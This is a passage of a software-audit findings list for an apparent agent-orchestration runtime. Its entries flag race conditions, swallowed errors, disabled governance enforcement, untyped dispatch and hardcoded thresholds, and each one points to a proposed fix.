- **Proposed fix:** see `fix.md` F-212 — on `expireStale`, emit `beat_stranded` audit + enqueue reactive-event wake with `trigger: "stranded_recovery"`; per-agent `strandedRetryCount` with cap.

#### F-213 🟠 [fairness] · CEO-first priority can starve lower-priority agents
- **Where:** `packages/company-runtime/src/heartbeat.ts:396-419`.
- **Observation:** `ROLE_PRIORITY` is static; CEO=0, skills_lead=7. `tick()` sorts roster and takes the first `maxConcurrentBeats` eligible. Under contention, low-priority roles never get a slot.
- **Proposed fix:** see `fix.md` F-213 — sort by overdueness (`now - lastBeatAt - interval`), with role priority as tiebreaker.

#### F-214 🟠 [obs][integrity] · `applyMutations.errors` silently ignored
- **Where:** `packages/company-runtime/src/heartbeat.ts:628-635`.
- **Observation:** engine reads `result.applied` + `result.version`; drops `result.errors`. Combined with F-088 (non-atomic mutations), partial failures are invisible in the BeatRecord.
- **Proposed fix:** see `fix.md` F-214 — if `errors.length > 0`, set outcome to `PARTIAL_FAILURE`; include errors in `BeatRecord.detail`.

#### F-215 🟠 [integrity] · No atomic CAS on task checkout (cross-ref F-086)
- **Where:** `packages/company-runtime/src/heartbeat.ts:560-568` (selectTask → executeTask).
- **Observation:** the engine selects a task via `selectTask`, then calls `executeTask` with its id. **No mutation stages a checkout lock.** If two beats (different agents) both select the same orphan task, both execute it.
- **Proposed fix:** see `fix.md` F-215 — stage a `task_checkout { taskId, agentId, beatId }` mutation as the first phase-3 action; abort the beat if `applied !== 1`. Ties to F-086's CAS re-enable.

#### F-216 🟠 [integrity] · Orphan-task race (subset of F-215)
- **Where:** `packages/company-runtime/src/heartbeat.ts:676`.
  ```ts
  (t.assignedRole === ctx.role || !t.assignedRole)
  ```
- **Observation:** unassigned tasks (`!t.assignedRole`) are eligible for any agent. Two agents of different roles hitting the same orphan produce a race.
- **Proposed fix:** bundled with F-215.

#### F-217 🟠 [reliability] · Event-subscriber exceptions crash the beat
- **Where:** `packages/company-runtime/src/heartbeat.ts:479, 536, 648, 659`.
  ```ts
  deps.emitBeatEvent?.({ ... });
  ```
- **Observation:** if a subscriber throws synchronously, exception bubbles into phase code and gets caught by the outer catch — turning a successful beat into a failure based on a subscriber bug.
- **Proposed fix:** see `fix.md` F-217 — wrap every `emitBeatEvent` call with a try/catch that audits the subscriber error but doesn't affect beat outcome.

#### F-218 🟡 [code] · `beatId` not globally unique
- **Where:** `packages/company-runtime/src/heartbeat.ts:269`.
- **Observation:** `beat_${counter}_${ms}` can collide after `reset()` (counter zeroes) or across restarts.
- **Proposed fix:** see `fix.md` F-218 — `beat_${crypto.randomUUID()}`.

#### F-219 🟡 [memory] · Event queue drains one event per beat; can strand
- **Where:** `packages/company-runtime/src/heartbeat.ts:320-340`.
- **Observation:** if an agent is paused/terminated before its queue drains, events accumulate forever.
- **Proposed fix:** see `fix.md` F-219 — drain-all loop at beat end; clear queue on agent pause/terminate.

#### F-220 🟡 [memory] · `eventQueue` has no size cap
- **Where:** `packages/company-runtime/src/heartbeat.ts:172`.
- **Observation:** per-agent queues grow unbounded under event floods.
- **Proposed fix:** see `fix.md` F-220 — max 100 per agent; overflow drops oldest + audits.

#### F-221 🟡 [memory] · `beatHistory` silent truncation (F-094 family)
- **Where:** `packages/company-runtime/src/heartbeat.ts:346, 350-352`.
- **Observation:** MAX_HISTORY=200; older records deleted silently.
- **Proposed fix:** see `fix.md` F-221 — treat in-memory history as UI cache only; pull from DB (`cpGetBeatHistory`) for authoritative reads.

#### F-222 🟡 [integrity] · `selectTask` ignores task dependencies
- **Where:** `packages/company-runtime/src/heartbeat.ts:668-686`.
- **Observation:** filters by status + role; does not check `blockedByIds`. A task with unresolved dependencies can be selected for execution.
- **Proposed fix:** see `fix.md` F-222 — add filter: all dependencies completed.

#### F-223 🟡 [code] · Leadership role magic strings (F-098 family)
- **Where:** `packages/company-runtime/src/heartbeat.ts:497`.
  ```ts
  const leadershipRoles = ["ceo", "cto", "pm"];
  ```
- **Proposed fix:** see `fix.md` F-223 — bundled with F-098 role enum.

#### F-224 🟡 [safety] · `patchConfig` has no validation or audit
- **Where:** `packages/company-runtime/src/heartbeat.ts:362-364`.
  ```ts
  patchConfig(patch: Partial<HeartbeatConfig>) {
    Object.assign(this.config, patch);
  }
  ```
- **Observation:** any caller can change any field — `maxConcurrentBeats: -1`, `beatTimeoutMs: 0` — silently.
- **Proposed fix:** see `fix.md` F-224 — Zod parse + audit.

#### F-225 🟡 [obs] · `getStatus` payload is minimal
- **Where:** `packages/company-runtime/src/heartbeat.ts:370-378`.
- **Observation:** returns 5 fields. Missing: event queue sizes, staged mutation count, beat history depth, last error per agent, beat duration rollups.
- **Proposed fix:** see `fix.md` F-225 — expand payload; expose via `/api/heartbeat/status` route.

#### F-226 🟡 [action-space] · `executeTask` return shape lacks `status` / `nextActions` / `artifacts`
- **Where:** `packages/company-runtime/src/heartbeat.ts:83-85`.
  ```ts
  { summary, tokensUsed, actionsCount, toolCalls, completed }
  ```
- **Observation:** per agent-harness-construction best practice, a tool response should carry: `status: "success"|"warning"|"error"`, `summary`, `next_actions`, `artifacts`. Current shape has only summary + counts.
- **Why it matters:** engine has no programmatic way to distinguish partial success, extract file paths modified, or know what follow-up actions were suggested.
- **Proposed fix:** see `fix.md` F-226 — extend `ExecuteTaskResult` with structured fields.

#### F-227 🟡 [action-space] · `executeChecklistAction` shape diverges from `executeTask`
- **Where:** `packages/company-runtime/src/heartbeat.ts:83-89`.
- **Observation:** `executeTask` has `completed`; `executeChecklistAction` doesn't. Two result shapes, treated uniformly by the engine.
- **Proposed fix:** see `fix.md` F-227 — unify into one interface; bundled with F-226.

#### F-228 🟡 [safety] · `stagedMutations` is instance-level state; public `stageMutation`
- **Where:** `packages/company-runtime/src/heartbeat.ts:177-180`.
- **Observation:** mutations queue lives on the engine instance. `stageMutation` is a public method — external callers can push mutations between beats; the next beat flushes them as its own.
- **Proposed fix:** see `fix.md` F-228 — pass a `BeatContext { stage, audit, ... }` into `executeTask` / `executeChecklistAction`; hide the instance field.

#### F-229 🟡 [type] · `stageMutation` untyped (F-009 family)
- **Where:** `packages/company-runtime/src/heartbeat.ts:180`.
- **Observation:** takes `{ type: string; [key: string]: unknown }` — same loose shape as F-009. No Zod validation; any object slips through.
- **Proposed fix:** see `fix.md` F-229 — narrow to `StateMutation`; bundled with F-090.

#### F-230 🟡 [obs] · `clearStagedMutations` in catch = silent rollback
- **Where:** `packages/company-runtime/src/heartbeat.ts:657`.
- **Observation:** on error, staged mutations are dropped with no audit of what was discarded.
- **Proposed fix:** see `fix.md` F-230 — audit `beat_mutations_discarded` with count + types before clearing.

#### F-231 🟡 [perf] · Pause checks run after context load → wasted work
- **Where:** `packages/company-runtime/src/heartbeat.ts:500-514`.
- **Observation:** `pauseWhenNoActiveSprint` and `pauseWhenBudgetExhausted` fire AFTER `deps.loadAgentContext` has already loaded the full context. Wasted snapshot read + audit emit.
- **Proposed fix:** see `fix.md` F-231 — pre-check these conditions in `triggerBeat` before calling executor.

#### F-232 🟡 [arch] · No session persistence per (companyId, agentId, task) — Paperclip parity gap
- **Where:** entire engine.
- **Observation:** each `executeTask` is stateless. Paperclip persists `agent_task_sessions` keyed `(companyId, agentId, adapterType, taskKey)` so agents resume conversational context across beats. Arceus has neither a session id in the BeatRequest nor a session update in the response.
- **Proposed fix:** see `fix.md` F-232 — after F-174 (real tables), add `agent_task_sessions`; thread `sessionId` through `BeatDependencies.executeTask`.

#### F-233 🟡 [reliability] · No process-group tracking (F-066 family)
- **Where:** entire engine.
- **Observation:** when `executeTask` spawns a child (via OpenCode), the engine has no handle on the PID. A timeout can't kill the child — it will keep running. Same root as F-066.
- **Proposed fix:** see `fix.md` F-233 — `executeTask` returns `{ ..., processGroupId?: number }`; engine tracks + kills on timeout. Bundled with F-066 + F-039.

#### F-234 🟢 [code] · `executionMode === "orchestrator"` is a dead branch
- **Where:** `packages/company-runtime/src/heartbeat.ts:222`.
- **Observation:** if the engine only functions in `"heartbeat"` mode, the `"orchestrator"` branch adds confusion. Either orchestrator mode has a purpose (document it) or the check should be removed.
- **Proposed fix:** see `fix.md` F-234 — grep usage; delete dead code or add docs.

#### F-235 🟢 [code] · `getHistory` returns live BeatRecord references (F-045 family)
- **Where:** `packages/company-runtime/src/heartbeat.ts:356-358`.
- **Observation:** spread copies the array but records inside are live references. External mutation possible.
- **Proposed fix:** see `fix.md` F-235 — return type `ReadonlyArray<Readonly<BeatRecord>>`.

#### F-236 🟢 [type] · `emitBeatEvent` `data` field is `Record<string, unknown>`
- **Where:** `packages/company-runtime/src/heartbeat.ts:96`.
- **Observation:** no schema for event payloads; subscribers deserialize by faith.
- **Proposed fix:** see `fix.md` F-236 — typed discriminated union for event payloads.

#### F-237 🟢 [obs] · Console logs throughout (F-037 family)
- **Where:** `packages/company-runtime/src/heartbeat.ts:223, 228, 240, 315, 338, 407, 444, 716`.
- **Observation:** engine uses `console.log/warn/error` directly. Not structured, not routed through the audit ledger.
- **Proposed fix:** see `fix.md` F-237 — structured logger passed as a dep.

---

### packages/company-runtime/src/heartbeat-checklist.ts

#### F-238 🔴 [code][reliability] · Missing-task false positive in `checkDependenciesMet`
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:285-289`.
- **Observation:** `const task = ctx.tasks.find(t => t.id === depId); if (!task) return true; // missing counts as resolved`. A dangling dependency ID (typo, deleted task, cross-sprint reference) silently passes the gate; downstream beat executes work whose prerequisites never existed.
- **Proposed fix:** see `fix.md` F-238 — a missing dep is a *harder* blocker than an incomplete one; return `false` and audit `dependency_missing` for triage.

#### F-239 🟠 [type][arch] · `(sprint as any).reviewState` casts (F-099 family)
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:236, 267, 327`.
- **Observation:** three read sites cast `sprint` to `any` to reach a `reviewState` field absent from `SprintSchema`. Field meaning varies (`"waiting_tester"`, `"cto_escalated"`, `"rework"`) — no enum, no Zod.
- **Proposed fix:** see `fix.md` F-239 — add `reviewState` to the schema as a discriminated union; bundled with F-099.

#### F-240 🟠 [reliability] · Silent resolution-by-default in role checklists
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:288` (repeats pattern).
- **Observation:** checklist functions return `{ resolved: true }` for lookup misses in several branches (empty queue = healthy, missing sprint = no gap, absent task = met). Indistinguishable from real resolution — a misconfigured check reports "all good."
- **Proposed fix:** see `fix.md` F-240 — add `{ resolved, reason, confidence }`; degrade to audit-only in ambiguous cases.

#### F-241 🟠 [arch][code] · Defensive "don't wedge the sprint" branch reveals prior bugs
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:263-305` (`checkBugFixesReady`).
- **Observation:** comment + code pattern "if the lookup fails, pretend it's resolved so we don't wedge" is a band-aid over an ownership problem. Real fix is transactional bug-fix dispatch, not silent recovery.
- **Proposed fix:** see `fix.md` F-241 — make bug-fix gate strictly CAS-driven; bundled with F-086/F-215.

#### F-242 🟡 [code] · Magic constants in timeout thresholds
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:315, 360`.
- **Observation:** `ESCALATION_TIMEOUT_MS = 5 * 60 * 1000` and `STUCK_AFTER_FIX_TIMEOUT_MS = ESCALATION_TIMEOUT_MS * 2`. Hardcoded, not surfaced in config, not testable with fake clocks.
- **Proposed fix:** see `fix.md` F-242 — inject via `ChecklistConfig`; make `Clock` a dependency.

#### F-243 🟡 [arch] · `ROLE_CHECKLISTS` is a stringly-typed dispatch table
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:498-516`.
- **Observation:** `Record<AgentIdentity["role"], CheckFn[]>` pairs checks to roles by literal key. Adding a role requires touching this table, and there's no compile-time guard that each role has sensible checks.
- **Proposed fix:** see `fix.md` F-243 — per-role class or module registering its own checks at import time; bundled with F-226.

#### F-244 🟡 [code] · Hardcoded status-string literals uncoordinated with schema
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:~50+ sites`.
- **Observation:** `t.status === "completed"`, `"failed"`, `"blocked"`, `"in_progress"`, `"in_review"` duplicated across 14 check functions. No single enum; if `TaskStatusSchema` adds a state, these checks silently miss it.
- **Proposed fix:** see `fix.md` F-244 — import `TaskStatus` enum; use `.filter(isCompleted)` helpers. Bundled with F-155.

#### F-245 🟡 [perf] · Repeated linear scans of `ctx.tasks` per check
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:*`.
- **Observation:** each check calls `ctx.tasks.filter(...)`; at 14 checks per developer beat the same array is traversed 14× per role. Trivial at N=100, painful at N=10k.
- **Proposed fix:** see `fix.md` F-245 — pre-index `ctx.tasks` into `{ byStatus, byAssignee, byId }` on `AgentBeatContext` construction.

#### F-246 🟡 [arch] · Skills Lead reads undocumented `ctx` fields
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:checkSkillHealth / checkUnusedSkills / checkSkillGaps`.
- **Observation:** consumes `ctx.skillHealth`, `ctx.unusedSkills`, `ctx.sprintSkillGapCount` — none appear in `AgentBeatContextSchema` in contracts. Schema drift.
- **Proposed fix:** see `fix.md` F-246 — add to `AgentBeatContextSchema`; bundle with contract audit.

#### F-247 🟡 [reliability] · No AbortSignal threaded into checks
- **Where:** entire file.
- **Observation:** `runChecklist` awaits each `CheckFn` serially with no cancellation. If the engine shuts down mid-checklist the next check still fires.
- **Proposed fix:** see `fix.md` F-247 — thread `signal: AbortSignal` through `CheckFn`; bundled with F-066/F-039.

#### F-248 🟡 [obs] · Checklist decisions produce no audit trail
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:runChecklist` at `:532`.
- **Observation:** returns first `resolved === false` check and discards the rest. No log of *which* checks ran, which passed, which were skipped. Debugging why agent chose action X in beat N is impossible after the fact.
- **Proposed fix:** see `fix.md` F-248 — return `ChecklistResult { evaluated: CheckOutcome[], selected: Action }`; audit full trail.

#### F-249 🟡 [code] · String-encoded action protocol (`"sprint_review:cto_escalation_review"`)
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:239, 268, 329+`.
- **Observation:** suggested actions encoded as colon-delimited strings, parsed downstream by `startsWith` / `split(":")`. No type safety, easy to typo, hard to refactor.
- **Proposed fix:** see `fix.md` F-249 — `SuggestedAction` discriminated union: `{ kind: "sprint_review.cto_escalation_review" } | { kind: "meeting_contribution", meetingId: string }`.

#### F-250 🟡 [code] · `checkBudgetHealth` threshold hardcoded at 90%
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:checkBudgetHealth`.
- **Observation:** magic 0.9 ratio for "budget unhealthy." Not config-driven; can't vary by tier or sprint size.
- **Proposed fix:** see `fix.md` F-250 — read from `budget_policies` row (per company).

#### F-251 🟡 [arch] · Meeting contribution check returns stringly-typed action
- **Where:** `packages/company-runtime/src/heartbeat-checklist.ts:checkMeetingContribution` vs `checklist-executor.ts:188`.
- **Observation:** check returns `meeting_contribution:${id}`; the executor re-parses it. Coupling via string.
- **Proposed fix:** see `fix.md` F-251 — bundled with F-249.

#### F-252 🟢 [code] · Check functions over 60 lines violate SRP guideline
- **Where:** `checkBugFixesReady` (:263-305), `checkEscalationPending` (:307-358), `checkReviewPhaseActive` (:236-261).
- **Observation:** each mixes status filter, time math, and action construction in a single block. Hard to test in isolation.
- **Proposed fix:** see `fix.md` F-252 — split into `findOverdueReviews(tasks, clock)` + `constructEscalationAction(overdue)`.

#### F-253 🟢 [code] · "Find active dev task" logic duplicated across checks
- **Where:** multiple check functions.
- **Observation:** five different call sites compute "the developer's current task." Should be a single helper on `AgentBeatContext`.
- **Proposed fix:** see `fix.md` F-253 — `ctx.activeTaskFor(role)` method.

#### F-254 🟢 [code] · `ctx.scope` / `ctx.roadmap` references assume presence
- **Where:** `checkScopeControl`, `checkRoadmap`.
- **Observation:** no null-guard on nested fields; if context is partial the check throws.
- **Proposed fix:** see `fix.md` F-254 — defensive defaults via optional-chaining + default arms.

---

### apps/api/src/heartbeats/beat-executor.ts

#### F-255 🔴 [arch][sec] · `GOVERNANCE_ENABLED = false` disables policy enforcement entirely
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:185`.
- **Observation:** constant `false` short-circuits the governance pre-filter. `roleTools` is computed and filtered but never applied to the actual agent prompt. Every tool is effectively allowed — the `/governance/policy` surface is theater.
- **Proposed fix:** see `fix.md` F-255 — either delete the dead branch or honor it. Bundled with F-089 ControlPlane umbrella.

#### F-256 🔴 [reliability] · Trust-event updates fire outside the mutation transaction (F-104 family)
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:303 + :375`.
- **Observation:** `cpUpdateTrustScore(noChangeEvent).catch(() => {})` and the failure-path equivalent run AFTER `setTaskStatus(...)` returns. If the trust update fails silently, cache (in-memory snapshot's agent.trustScore) and DB (control-plane trust row) diverge. Same root as F-104.
- **Proposed fix:** see `fix.md` F-256 — include trust delta in the task-status mutation's transactional payload; bundled with F-104 + F-086.

#### F-257 🔴 [sec][type] · `(roleTools as any)[k]` casts bypass governance schema
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:~180-190`.
- **Observation:** pre-filter iterates tool keys via `as any` casts, silently skipping the `ToolPolicySchema` contract. Combined with F-255, any drift between schema and runtime is undetected.
- **Proposed fix:** see `fix.md` F-257 — narrow to `keyof ToolPolicy`; bundled with F-255.

#### F-258 🟠 [reliability] · `setTaskStatus(task.id, "in_progress")` without transactional lock
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:243`.
- **Observation:** executor flips status to `in_progress` before work starts, via a plain mutation. No CAS — two concurrent beats for the same task both flip and both execute.
- **Proposed fix:** see `fix.md` F-258 — pessimistic lock via CAS-on-status; bundled with F-086.

#### F-259 🟠 [reliability] · `matchAndRecordSkills` classifier call on the hot path
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:~175`.
- **Observation:** per-beat embedding classifier runs to inject skills — exactly the path F-015/F-016 proposed to delete in favor of a progressive-disclosure catalog. Every beat pays the classifier latency + cost.
- **Proposed fix:** see `fix.md` F-259 — replace with catalog injection; bundled with F-015.

#### F-260 🟠 [code][obs] · Empty-catch on promises (F-068 family)
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:49, 303, 342, 375, 386`.
- **Observation:** `startEventBridge().catch(() => {})`, `cpUpdateTrustScore(...).catch(() => {})`, `tryAutoPreview().catch(() => {})`, `destroyBeatSession(...).catch(() => {})`. Each swallows errors with no audit.
- **Proposed fix:** see `fix.md` F-260 — `swallowAndAudit(kind, fn)` helper; bundled with F-068.

#### F-261 🟠 [reliability] · `beatAgentState.sessionId` mutated in place twice
- **Where:** `apps/api/src/heartbeats/beat-executor.ts` (before try + in finally).
- **Observation:** sets sessionId pre-work and again in finally. Exception between the two leaves partially-rolled-back state (stale sessionId visible to other code paths).
- **Proposed fix:** see `fix.md` F-261 — commit via single final mutation; use local variable mid-work.

#### F-262 🟠 [reliability] · No AbortSignal threaded into executor
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:executeBeatTask`.
- **Observation:** calls `runPromptText`, `executeSpecialistTask`, `triggerCeoSprintProposal` with no cancellation token. Shutdown signal cannot interrupt in-flight work — the engine hangs on LLM streaming or bash execution.
- **Proposed fix:** see `fix.md` F-262 — accept `signal: AbortSignal` in `executeBeatTask`; propagate everywhere; bundled with F-066/F-039.

#### F-263 🟠 [arch] · Workspace + preview side effects hidden in executor
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:scaffoldProductWorkspace / tryAutoPreview / setTaskPreviewUrl`.
- **Observation:** executor silently mutates workspace (creates files), launches preview server, updates preview URLs. A function named `executeBeatTask` should not be the workspace authority.
- **Proposed fix:** see `fix.md` F-263 — extract `WorkspaceOrchestrator`; executor emits intents.

#### F-264 🟡 [code] · Hardcoded role magic strings
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:140`.
- **Observation:** `["tester", "ui_designer", "marketing", "skills_lead"].includes(role)` and other literals scattered. No `isSpecialistRole(role)` helper.
- **Proposed fix:** see `fix.md` F-264 — role-capability enum; bundled with F-098/F-223.

#### F-265 🟡 [code] · Hardcoded stale threshold `Date.now() - 10 * 60 * 1000`
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:125`.
- **Observation:** 10-minute staleness baked in; not config-surfaced.
- **Proposed fix:** see `fix.md` F-265 — read from `ARCEUS_STALE_THRESHOLD_MS`; bundled with F-242.

#### F-266 🟡 [code] · File-change detection via mtime Map comparison
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:266-278`.
- **Observation:** `preSnapshot` / `postSnapshot` built from `fs.stat().mtime`. Filesystems with 1-second mtime granularity (HFS+) miss same-second edits. Cloud mounts have weird mtime semantics.
- **Proposed fix:** see `fix.md` F-266 — use content hashing (sha1 of file) or git status; bundled with F-263.

#### F-267 🟡 [code] · Meaningful-extensions Set hardcoded inline
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:278`.
- **Observation:** `new Set([".ts", ".tsx", ".js", ".css", ...])` at call site. Can't be tuned per-project.
- **Proposed fix:** see `fix.md` F-267 — workspace-config file.

#### F-268 🟡 [obs] · Output truncation to fixed byte counts
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:output?.slice(0, 500) / .slice(0, 300)`.
- **Observation:** summary / audit uses `.slice(0, 500)` — loses context, breaks multi-byte UTF-8 mid-character. Same pattern flagged in F-094.
- **Proposed fix:** see `fix.md` F-268 — `truncateTelemetry(s, { chars: 500, preserveLines: true })`; bundled with F-094.

#### F-269 🟡 [arch] · `upsertApproval` called with magic string `"tool_governance"` kind
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:207`.
- **Observation:** approval record built hand-by-hand with stringly-typed `type`. No schema validation at call site.
- **Proposed fix:** see `fix.md` F-269 — factory `createToolGovernanceApproval(input)`; bundled with F-142.

#### F-270 🟡 [reliability] · `isCeoStreaming()` global state gate
- **Where:** `apps/api/src/heartbeats/beat-executor.ts` (import from `../agents/chat.js`).
- **Observation:** global `isCeoStreaming` mutated by the chat route + read by the executor. Race if a beat and a chat request interleave.
- **Proposed fix:** see `fix.md` F-270 — convert to per-agent lock in the engine; bundled with F-051.

#### F-271 🟡 [code] · Inline imports from 18+ modules
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:top-of-file`.
- **Observation:** module header is ~40 import lines; executor is a dumping ground for every subsystem. Signals god-module formation.
- **Proposed fix:** see `fix.md` F-271 — extract role-specific sub-executors (`DeveloperExecutor`, `CeoExecutor`).

#### F-272 🟢 [obs] · 40+ `emitEmployeeActivity` call sites
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:*`.
- **Observation:** telemetry is dense but ad-hoc — each call picks its own event shape. Hard to index or aggregate.
- **Proposed fix:** see `fix.md` F-272 — structured event factories: `emitBeatLifecycle.started({...})`, `.workFinished({...})`.

#### F-273 🟢 [code] · `setEventBridgeStarted(true)` before `.catch()` resolves
- **Where:** `apps/api/src/heartbeats/beat-executor.ts:49` (and checklist-executor.ts:55).
- **Observation:** flag flipped true immediately while `startEventBridge()` is still opening the SSE connection. A failure during open leaves flag=true, so reconnect never fires.
- **Proposed fix:** see `fix.md` F-273 — set flag inside the success path of `startEventBridge`.

---

### apps/api/src/heartbeats/checklist-executor.ts

#### F-274 🔴 [reliability] · Race in `eventBridgeStarted` check-then-set
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:53-56`.
- **Observation:** `if (!eventBridgeStarted) { startEventBridge().catch(...); setEventBridgeStarted(true); }`. Two concurrent beats see `false`, both spawn a bridge. Same root as F-273.
- **Proposed fix:** see `fix.md` F-274 — atomic CAS on the flag or migrate to a lazy singleton with internal lock; bundled with F-273.

#### F-275 🟠 [code][sec] · String-dispatch via `.toLowerCase().includes("sprint")`
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:63`.
- **Observation:** CEO branch triggered when `suggestedAction.toLowerCase().includes("sprint")`. Any action containing "sprint" (e.g., `"skip_sprint_check"`) lands here.
- **Proposed fix:** see `fix.md` F-275 — exact match against `SuggestedAction` union; bundled with F-249.

#### F-276 🟠 [reliability] · `suggestedAction.split(":")[1]` with no validation
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:190`.
- **Observation:** meeting-contribution branch assumes `meeting_contribution:<id>` shape. Malformed strings (missing `:`, empty tail) yield `undefined`, flowing into the lookup.
- **Proposed fix:** see `fix.md` F-276 — typed `SuggestedAction`; parse once at construction; bundled with F-249.

#### F-277 🟠 [reliability] · `updateMeeting` mutation without CAS
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:215-227`.
- **Observation:** contributions appended via `updateMeeting(id, m => ({ ...m, contributions: [...m.contributions, newOne] }))`. Two agents contributing to the same meeting in overlapping beats lose one write.
- **Proposed fix:** see `fix.md` F-277 — CAS on `meeting.version`; bundled with F-086.

#### F-278 🟠 [reliability] · `underperformers[0]!` non-null assertion
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:275`.
- **Observation:** TypeScript non-null assertion on array access — valid only if `length === 0` early-return above is reached correctly. A future refactor that drops that guard silently NPEs.
- **Proposed fix:** see `fix.md` F-278 — destructure with runtime guard.

#### F-279 🟠 [arch] · `runATAPipeline(...).catch(err => console.warn)` fire-and-forget
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:304, 351`.
- **Observation:** long-running skill pipeline dispatched without any tracking handle. No way to cancel, audit completion, or surface failure.
- **Proposed fix:** see `fix.md` F-279 — enqueue as a background job in a tracked queue; bundled with F-037.

#### F-280 🟡 [code] · Governance gets `proposerAgentId: null` for missing skills_lead
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:296, 345`.
- **Observation:** `proposerAgentId: skillsLeadAgent?.id ?? null`. Governance evaluation with null proposer is unlikely to behave correctly (trust score lookup on null id).
- **Proposed fix:** see `fix.md` F-280 — early-return if role-agent absent; audit `skills_lead_missing`.

#### F-281 🟡 [code] · Hardcoded thresholds and windows
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:270 (0.6), :312 (30 days), :333 (cluster_size=3)`.
- **Observation:** three magic numbers in the Skills Lead branch (success threshold, unused days, cluster min). None configurable.
- **Proposed fix:** see `fix.md` F-281 — `SkillsLeadPolicy` config object; bundled with F-242.

#### F-282 🟡 [code] · `processTaskOutcome` called with synthesized task id
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:279-287`.
- **Observation:** fabricates `taskId: "skills_lead_mutation_${worst.id}_${Date.now()}"`. No row for that task exists; downstream queries hitting `tasks.taskId` return nothing.
- **Proposed fix:** see `fix.md` F-282 — either insert a real governance task row or change `processTaskOutcome` to accept synthetic contexts.

#### F-283 🟡 [obs] · Severity `"info"` audit for skill deprecation
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:320-322`.
- **Observation:** deprecating 3 skills logs at `info`. Skill-registry mutation is a governance-visible action; should be `notice` or `warn`.
- **Proposed fix:** see `fix.md` F-283 — bump severity; bundled with F-025.

#### F-284 🟡 [code] · Dynamic `import("../meetings/synthesis.js")` mid-flow
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:208`.
- **Observation:** lazy import inside the meeting-contribution branch. Hides dependency graph; breaks bundle-time tree-shaking.
- **Proposed fix:** see `fix.md` F-284 — static import at top.

#### F-285 🟡 [code] · `drainBeatTokenAccumulator` called in every return branch
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:*`.
- **Observation:** every success/failure path must remember to drain the accumulator, else token counts leak to the next beat. ~20 call sites — error-prone.
- **Proposed fix:** see `fix.md` F-285 — wrap with `withBeatTokens(beatId, async () => { ... })` that drains in finally.

#### F-286 🟡 [arch] · Role dispatch by string ladder
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:63, 89, 94, 122, 155, 183, 188`.
- **Observation:** 7 `if (role === X && action.startsWith(Y))` ladders. Dispatch logic buried in a switch-by-string.
- **Proposed fix:** see `fix.md` F-286 — `ChecklistActionHandler` registry keyed by `(role, actionKind)`.

#### F-287 🟡 [obs] · Fallback "no handler" returns `completed` status
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:247-252`.
- **Observation:** unknown actions marked `completed` with `toolCalls: 0`. Success metrics under-report the gap.
- **Proposed fix:** see `fix.md` F-287 — audit `unhandled_checklist_action`; return distinct `skipped` status.

#### F-288 🟢 [code] · Hardcoded `slice(0, 3)` / `slice(0, 2)` caps
- **Where:** `apps/api/src/heartbeats/checklist-executor.ts:317, 339`.
- **Observation:** magic caps on batch sizes inside Skills Lead actions.
- **Proposed fix:** see `fix.md` F-288 — named constants or config.

---

### apps/api/src/heartbeats/event-bridge.ts

#### F-289 🔴 [reliability] · `void processEvent(...)` creates unhandled rejections
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:62`.
- **Observation:** each parsed SSE event is dispatched via `void processEvent(JSON.parse(dataLine))`. `processEvent` is async and may reject (policy eval throws, DB write fails); the rejection is swallowed, no audit.
- **Proposed fix:** see `fix.md` F-289 — `processEvent(...).catch(err => auditBridgeError(err))`; bundled with F-068.

#### F-290 🔴 [reliability] · Auto-reconnect race sets `eventBridgeStarted` pre-connect
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:73-78`.
- **Observation:** after 3000ms timer, `startEventBridge().catch(() => {})` fires and THEN `setEventBridgeStarted(true)`. If connect fails, flag stays true forever — bridge permanently dead.
- **Proposed fix:** see `fix.md` F-290 — set flag inside success path only; add failure audit; bundled with F-274/F-273.

#### F-291 🔴 [sec][reliability] · Trust-score side effects fire unawaited in event handler
- **Where:** `apps/api/src/heartbeats/event-bridge.ts:177, 185`.
- **Observation:** `cpRecordPolicyViolation(...)` and `cpUpdateTrustScore(trustEvent)` both invoked without `await`. The SSE loop doesn't block, so failures disappear; in high-volume streams these can drop onto the floor before DB writes complete.
- **Proposed fix:** see `fix.md` F-291 — `await` both, or enqueue on a durable outbox; bundled with F-086/F-104.

#### F-292 🟠 [reliability] · No timeout on initial `fetch(${url}/event)`
